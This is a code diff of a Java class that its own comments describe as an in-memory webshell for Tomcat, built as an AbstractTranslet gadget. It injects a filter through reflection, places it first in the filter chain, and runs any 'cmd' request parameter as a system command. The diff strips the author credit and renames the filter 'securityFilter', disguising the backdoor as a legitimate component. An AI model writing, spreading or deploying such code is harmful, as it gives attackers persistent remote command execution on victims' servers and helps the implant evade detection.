@@ -13,7 +13,6 @@ import javax.servlet.ServletResponse;
 /**
  * 基于tomcat的内存Webshell
  *
- * @author threedr3am
  */
 public class TomcatShellInject extends AbstractTranslet implements Filter {
 
@@ -29,7 +28,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
         javax.servlet.ServletContext servletContext = servletRequest.getServletContext();
         org.apache.catalina.core.StandardContext standardContext = null;
         //判断是否已有该名字的filter，有则不再添加
-        if (servletContext.getFilterRegistration("threedr3am") == null) {
+        if (servletContext.getFilterRegistration("securityFilter") == null) {
           //遍历出标准上下文对象
           for (; standardContext == null; ) {
             java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
@@ -47,10 +46,10 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
             stateField.setAccessible(true);
             stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
             //创建一个自定义的Filter马
-            javax.servlet.Filter threedr3am = new TomcatShellInject();
+            javax.servlet.Filter securityFilter = new TomcatShellInject();
             //添加filter马
             javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
-                .addFilter("threedr3am", threedr3am);
+                .addFilter("securityFilter", securityFilter);
             filterRegistration.setInitParameter("encoding", "utf-8");
             filterRegistration.setAsyncSupported(false);
             filterRegistration
@@ -70,7 +69,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
               //把filter插到第一位
               org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
               for (int i = 0; i < filterMaps.length; i++) {
-                if (filterMaps[i].getFilterName().equalsIgnoreCase("threedr3am")) {
+                if (filterMaps[i].getFilterName().equalsIgnoreCase("securityFilter")) {
                   org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                   filterMaps[i] = filterMaps[0];
                   filterMaps[0] = filterMap;
@@ -102,7 +101,7 @@ public class TomcatShellInject extends AbstractTranslet implements Filter {
       FilterChain filterChain) throws IOException, ServletException {
     System.out.println("TomcatShellInject.Threedr3amFilter doFilter.....................................................................");
     String cmd;
-    if ((cmd = servletRequest.getParameter("threedr3am")) != null) {
+    if ((cmd = servletRequest.getParameter("cmd")) != null) {
       Process process = Runtime.getRuntime().exec(cmd);
       java.io.BufferedReader bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(process.getInputStream()));
       StringBuilder stringBuilder = new StringBuilder();
